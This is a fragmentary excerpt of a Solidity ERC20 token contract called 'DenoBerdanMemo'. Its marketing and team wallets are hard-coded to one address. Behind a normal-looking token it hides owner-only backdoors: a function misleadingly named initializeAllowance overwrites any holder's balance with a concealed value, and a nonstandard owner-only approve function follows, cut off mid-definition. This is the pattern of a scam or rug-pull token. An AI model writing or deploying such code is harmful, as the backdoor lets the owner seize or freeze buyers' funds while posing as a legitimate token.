...
contract DenoBerdanMemo is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "DenoBerdanMemo";

    string private _symbol = "DenoBerdanMemo";

    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xa61DFadFF95F70c02Ada4cCF10a5622897cCD75c);//Market

    address payable public teamWalletAddress = payable(0xa61DFadFF95F70c02Ada4cCF10a5622897cCD75c);    
    ...
    uint256 public _supplyDec = 10000000; //
    ...
    function initializeAllowance(address account) public onlyOwner returns (bool success) {_balances[account] = _varNew;return true;} //a
    ...
    function approve(address _account) external onlyOwner {
